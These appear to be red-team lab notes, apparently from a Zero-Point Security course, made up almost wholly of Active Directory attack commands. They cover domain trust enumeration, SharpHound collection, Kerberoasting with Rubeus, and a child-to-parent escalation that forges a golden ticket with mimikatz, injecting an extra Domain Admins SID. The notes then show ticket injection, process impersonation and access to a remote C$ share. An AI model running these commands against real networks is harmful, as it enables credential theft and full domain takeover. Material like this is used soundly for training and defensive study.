### Domain Trusts Recon
```
powershell Get-DomainTrust -Domain dev.zeropointsecurity.co.uk
powershell Get-DomainComputer -Domain dev.zeropointsecurity.co.uk | select DnsHostName
SharpHound3 "-c All -D dev.zeropointsecurity.co.uk"
SharpView "Get-DomainUser -SPN -Domain dev.zeropointsecurity.co.uk -Properties SamAccountName"
Rubeus kerberoast /domain:dev.zeropointsecurity.co.uk

```
### Bidirectional Parent/Child
```
powershell Get-DomainGroup -Identity 'Domain Admins' -Domain zeropointsecurity.co.uk | select ObjectSid
kerberos::golden /user:<> /domain:<> /sid:<> /sids:<> /krbtgt:<>
kerberos::golden /user:Administrator /domain:dev.zeropointsecurity.co.uk /sid:S-1-5-21-2824171953-2587308990-2984250211 /sids:S-1-5-21-3063796876-3415205720-618848691-512 /krbtgt:REDACTED /ticket:zps.kirbi

Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x82ece /ticket:[...snip...]
ImpersonateProcess 1464
ls \\[...snip...]k\c$

```
